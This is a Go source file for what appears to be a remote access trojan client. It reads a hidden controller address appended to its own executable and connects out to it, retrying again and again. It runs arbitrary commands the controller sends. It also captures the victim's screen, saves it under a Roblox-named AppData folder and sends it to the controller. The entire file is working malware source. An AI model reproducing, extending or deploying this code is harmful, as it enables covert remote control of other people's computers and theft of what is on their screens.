package main

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

type Client struct {
	id         int
	clientName string
	clientAddr string
	cmdch      chan []byte
}

var (
	ip   string
	port int
)

///
// Consts
///

var RetryAttempts int = 20
var RetryInterval int = 10

///
// End Consts
///

var remainingRetryAttempts = RetryAttempts

func RetryConnection() {
	if remainingRetryAttempts == 0 {
		os.Exit(-1)
	}

	remainingRetryAttempts -= 1
	Connect()
}

func Connect() {
	HostIp := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("tcp", HostIp)
	if err != nil {
		time.Sleep(time.Duration(RetryInterval) * time.Second)
		RetryConnection()
		return
	}
	fmt.Println("Connected")

	reader := bufio.NewReader(conn)

	for {
		payloadRaw, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		var payload map[string]interface{}
		err = json.Unmarshal([]byte(payloadRaw), &payload)
		if err != nil {
			continue
		}

		if payload["type"] == "remote" {
			command := payload["command"].(string)
			parts := strings.Fields(command)
			cmd := exec.Command(parts[0], parts[1:]...)
			err := cmd.Run()
			if err != nil {
				continue
			}
			continue
		} else if payload["type"] == "screenshot" {
			img, err := screenshot.CaptureDisplay(0)
			if err != nil {
				return
			}
			file, err := os.Create("%appdata%/roblox/screenshot.png")
			if err != nil {
				return
			}
			defer file.Close()

			err = png.Encode(file, img)
			if err != nil {
				return
			}

			imageFilePath := "%appdata%/roblox/screenshot.png"
			imageFile, err := os.Open(imageFilePath)
			if err != nil {
				return
			}
			conn.Write([]byte{byte(len(imageFilePath))})
			conn.Write([]byte(imageFilePath))
			buffer := make([]byte, 1024)
			for {
				n, err := imageFile.Read(buffer)
				if err == io.EOF {
					break
				}
				if err != nil {
					return
				}
				conn.Write(buffer[:n])
			}
		} else if payload["type"] == "audio" {
			continue
		}
	}

	RetryConnection()
}

func main() {
	exePath, _ := os.Executable()
	data, _ := ioutil.ReadFile(exePath)
	startIndex := len(data) - 6
	port = int(binary.LittleEndian.Uint16(data[startIndex : startIndex+2]))
	ipBytes := data[startIndex+2 : startIndex+6]
	ip = fmt.Sprintf("%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3])

	Connect()
}
